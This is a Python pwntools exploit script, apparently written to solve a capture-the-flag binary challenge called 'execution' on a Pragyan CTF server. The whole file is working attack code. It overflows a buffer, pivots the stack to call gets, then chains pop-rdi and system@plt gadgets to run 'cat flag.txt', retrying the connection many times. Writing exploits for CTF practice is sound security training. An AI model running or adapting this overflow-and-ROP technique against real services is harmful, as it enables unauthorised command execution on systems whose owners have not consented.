
# -- coding: utf-8 --
from pwn import *
# context.log_level = 'debug'
context.log_level = 'critical'
# ENV
PORT =  12386
HOST = "execution.ctf.pragyan.org"

e = context.binary = ELF('./execution')
# lib = ELF('libc-2.31.so')
lib = e.libc
# if len(sys.argv) > 1 and sys.argv[1] == 'r':
    # r = remote(HOST, PORT)
# else:
# r = e.process()
    # pause()

# VARIABLE

# PAYLOAD
pop_rdi_ret= 0x0000000000400703 
ret = 0x00000000004004c9
main =0x000000000040067c
system_plt =0x4004f6
gets=0x400668
for i in range(10000):
    base=0x621900
    r = remote(HOST, PORT)
    payload = b""
    payload = payload.ljust(64,b"a")
    payload+= flat(base +0x1000, gets)
    # pause()
    r.sendlineafter(b"Tell us some review about our program: \n",payload)

    payload = b"cat flag.txt "
    payload = payload.ljust(72,b"a")
    payload+= flat(ret, pop_rdi_ret, base -127568+0x1000, system_plt, main)
    # pause()
    time.sleep(1)
    r.sendline(payload)

r.interactive()